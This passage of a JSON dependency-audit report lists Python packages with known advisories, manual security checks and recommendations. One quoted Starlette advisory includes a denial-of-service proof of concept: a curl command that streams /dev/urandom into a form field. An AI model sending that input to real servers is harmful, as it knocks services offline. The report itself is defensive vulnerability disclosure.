          },
          {
            "id": "PYSEC-2025-49",
            "fix_versions": [
              "78.1.1"
            ],
            "description": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. A path traversal vulnerability in `PackageIndex` is present in setuptools prior to version 78.1.1. An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to remote code execution depending on the context. Version 78.1.1 fixes the issue."
          },
          {
            "id": "GHSA-cx63-2mw6-8hw5",
            "fix_versions": [
              "70.0.0"
            ],
            "description": "A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0."
          }
        ]
      },
      {
        "name": "shellingham",
        "version": "1.5.4",
        "vulns": []
      },
      {
        "name": "six",
        "version": "1.15.0",
        "vulns": []
      },
      {
        "name": "smmap",
        "version": "5.0.2",
        "vulns": []
      },
      {
        "name": "sniffio",
        "version": "1.3.1",
        "vulns": []
      },
      {
        "name": "sortedcontainers",
        "version": "2.4.0",
        "vulns": []
      },
      {
        "name": "soupsieve",
        "version": "2.8.1",
        "vulns": []
      },
      {
        "name": "sqlalchemy",
        "version": "2.0.25",
        "vulns": []
      },
      {
        "name": "stack-data",
        "version": "0.6.3",
        "vulns": []
      },
      {
        "name": "starlette",
        "version": "0.35.1",
        "vulns": [
          {
            "id": "GHSA-f96h-pmfr-66vw",
            "fix_versions": [
              "0.40.0"
            ],
            "description": "### Summary Starlette treats `multipart/form-data` parts without a `filename` as text form fields and buffers those in byte strings with no size limit. This allows an attacker to upload arbitrary large form fields and cause Starlette to both slow down significantly due to excessive memory allocations and copy operations, and also consume more and more memory until the server starts swapping and grinds to a halt, or the OS terminates the server process with an OOM error. Uploading multiple such requests in parallel may be enough to render a service practically unusable, even if reasonable request size limits are enforced by a reverse proxy in front of Starlette.  ### PoC  ```python from starlette.applications import Starlette from starlette.routing import Route  async def poc(request):     async with request.form():         pass  app = Starlette(routes=[     Route('/', poc, methods=[\"POST\"]), ]) ```  ```sh curl http://localhost:8000 -F 'big=</dev/urandom' ```  ### Impact This Denial of service (DoS) vulnerability affects all applications built with Starlette (or FastAPI) accepting form requests. "
          },
          {
            "id": "GHSA-2c2j-9gv5-cj73",
            "fix_versions": [
              "0.47.2"
            ],
            "description": "### Summary When parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk. This blocks the event thread which means we can't accept new connections.  ### Details Please see this discussion for details: https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403. In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.  ```python      @property     def _in_memory(self) -> bool:         # check for SpooledTemporaryFile._rolled         rolled_to_disk = getattr(self.file, \"_rolled\", True)         return not rolled_to_disk      async def write(self, data: bytes) -> None:         if self.size is not None:             self.size += len(data)          if self._in_memory:             self.file.write(data)         else:             await run_in_threadpool(self.file.write, data) ```  I have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962   ### PoC See the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.  ### Impact To be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact."
          }
        ]
      },
      {
        "name": "stevedore",
        "version": "5.5.0",
        "vulns": []
      },
      {
        "name": "streamlit",
        "version": "1.50.0",
        "vulns": []
      },
      {
        "name": "structlog",
        "version": "24.1.0",
        "vulns": []
      },
      {
        "name": "sympy",
        "version": "1.14.0",
        "vulns": []
      },
      {
        "name": "ta",
        "version": "0.11.0",
        "vulns": []
      },
      {
        "name": "tenacity",
        "version": "8.5.0",
        "vulns": []
      },
      {
        "name": "textblob",
        "version": "0.17.1",
        "vulns": []
      },
      {
        "name": "threadpoolctl",
        "version": "3.6.0",
        "vulns": []
      },
      {
        "name": "tokenizers",
        "version": "0.22.1",
        "vulns": []
      },
      {
        "name": "toml",
        "version": "0.10.2",
        "vulns": []
      },
      {
        "name": "tomli",
        "version": "2.3.0",
        "vulns": []
      },
      {
        "name": "tomlkit",
        "version": "0.13.3",
        "vulns": []
      },
      {
        "name": "torch",
        "version": "2.8.0",
        "vulns": []
      },
      {
        "name": "tornado",
        "version": "6.5.4",
        "vulns": []
      },
      {
        "name": "tqdm",
        "version": "4.67.1",
        "vulns": []
      },
      {
        "name": "traitlets",
        "version": "5.14.3",
        "vulns": []
      },
      {
        "name": "transformers",
        "version": "4.57.3",
        "vulns": []
      },
      {
        "name": "typer",
        "version": "0.21.0",
        "vulns": []
      },
      {
        "name": "typer-slim",
        "version": "0.21.0",
        "vulns": []
      },
      {
        "name": "types-requests",
        "version": "2.31.0.10",
        "vulns": []
      },
      {
        "name": "typing-extensions",
        "version": "4.15.0",
        "vulns": []
      },
      {
        "name": "typing-inspection",
        "version": "0.4.2",
        "vulns": []
      },
      {
        "name": "tzdata",
        "version": "2025.3",
        "vulns": []
      },
      {
        "name": "tzlocal",
        "version": "5.3.1",
        "vulns": []
      },
      {
        "name": "urllib3",
        "version": "2.3.0",
        "vulns": [
          {
            "id": "GHSA-48p4-8xcf-vxj5",
            "fix_versions": [
              "2.5.0"
            ],
            "description": "urllib3 [supports](https://urllib3.readthedocs.io/en/2.4.0/reference/contrib/emscripten.html) being used in a Pyodide runtime utilizing the [JavaScript Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) or falling back on [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest). This means you can use Python libraries to make HTTP requests from your browser or Node.js. Additionally, urllib3 provides [a mechanism](https://urllib3.readthedocs.io/en/2.4.0/user-guide.html#retrying-requests) to control redirects.  However, the `retries` and `redirect` parameters are ignored with Pyodide; the runtime itself determines redirect behavior.   ## Affected usages  Any code which relies on urllib3 to control the number of redirects for an HTTP request in a Pyodide runtime.   ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects may remain vulnerable if a Pyodide runtime redirect mechanism is unsuitable.   ## Remediation  If you use urllib3 in Node.js, upgrade to a patched version of urllib3.  Unfortunately, browsers provide no suitable way which urllib3 can use: `XMLHttpRequest` provides no control over redirects, the Fetch API returns `opaqueredirect` responses lacking data when redirects are controlled manually. Expect default browser behavior for redirects."
          },
          {
            "id": "GHSA-pq67-6m6q-mj2v",
            "fix_versions": [
              "2.5.0"
            ],
            "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level."
          },
          {
            "id": "GHSA-gm62-xv2j-4w53",
            "fix_versions": [
              "2.6.0"
            ],
            "description": "## Impact  urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).  However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.   ## Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.   ## Remediation  Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.  If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers[\"content-encoding\"]` contains a safe number of encodings before reading the response content."
          },
          {
            "id": "GHSA-2xpw-w6gg-jr37",
            "fix_versions": [
              "2.6.0"
            ],
            "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane. Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/)."
          }
        ]
      },
      {
        "name": "uuid6",
        "version": "2024.7.10",
        "vulns": []
      },
      {
        "name": "uvicorn",
        "version": "0.27.0",
        "vulns": []
      },
      {
        "name": "uvloop",
        "version": "0.22.1",
        "vulns": []
      },
      {
        "name": "validators",
        "version": "0.35.0",
        "vulns": []
      },
      {
        "name": "vine",
        "version": "5.1.0",
        "vulns": []
      },
      {
        "name": "virtualenv",
        "version": "20.35.4",
        "vulns": []
      },
      {
        "name": "watchdog",
        "version": "6.0.0",
        "vulns": []
      },
      {
        "name": "watchfiles",
        "version": "1.1.1",
        "vulns": []
      },
      {
        "name": "wcwidth",
        "version": "0.2.14",
        "vulns": []
      },
      {
        "name": "webencodings",
        "version": "0.5.1",
        "vulns": []
      },
      {
        "name": "websocket-client",
        "version": "1.9.0",
        "vulns": []
      },
      {
        "name": "websockets",
        "version": "15.0.1",
        "vulns": []
      },
      {
        "name": "wheel",
        "version": "0.37.0",
        "vulns": [
          {
            "id": "PYSEC-2022-43017",
            "fix_versions": [
              "0.38.1"
            ],
            "description": "An issue discovered in Python Packaging Authority (PyPA) Wheel 0.37.1 and earlier allows remote attackers to cause a denial of service via attacker controlled input to wheel cli."
          }
        ]
      },
      {
        "name": "wrapt",
        "version": "1.17.3",
        "vulns": []
      },
      {
        "name": "xxhash",
        "version": "3.6.0",
        "vulns": []
      },
      {
        "name": "yarl",
        "version": "1.22.0",
        "vulns": []
      },
      {
        "name": "yfinance",
        "version": "0.2.33",
        "vulns": []
      },
      {
        "name": "zipp",
        "version": "3.23.0",
        "vulns": []
      },
      {
        "name": "zstandard",
        "version": "0.25.0",
        "vulns": []
      }
    ],
    "fixes": []
  },
  "manual_checks": {
    "checks": [
      [
        "Environment variables",
        "PASS",
        "JWT_SECRET_KEY configured"
      ],
      [
        "Rate limiting",
        "PASS",
        "Rate limiting middleware enabled"
      ],
      [
        "Security headers",
        "PASS",
        "Security headers middleware enabled"
      ],
      [
        "Password hashing",
        "PASS",
        "Using bcrypt for password hashing"
      ],
      [
        "SQL injection",
        "PASS",
        "No obvious SQL injection vulnerabilities"
      ],
      [
        "Hardcoded secrets",
        "WARN",
        "Potential secrets in 2 files"
      ]
    ],
    "passed": 5,
    "failed": 0,
    "warnings": 1
  },
  "vulnerabilities": [],
  "recommendations": [
    "Review files for hardcoded secrets",
    "Implement regular security audits (monthly)",
    "Keep dependencies up to date",
    "Use environment variables for secrets",
    "Enable HTTPS in production",
    "Implement request logging for security monitoring",
    "Add rate limiting to all public endpoints",
    "Use secure session management",
    "Implement CSRF protection for state-changing operations",
    "Regular penetration testing",
    "Security training for development team"
  ],
  "critical_count": 0,
  "high_count": 0,
  "medium_count": 0,
  "low_count": 0
}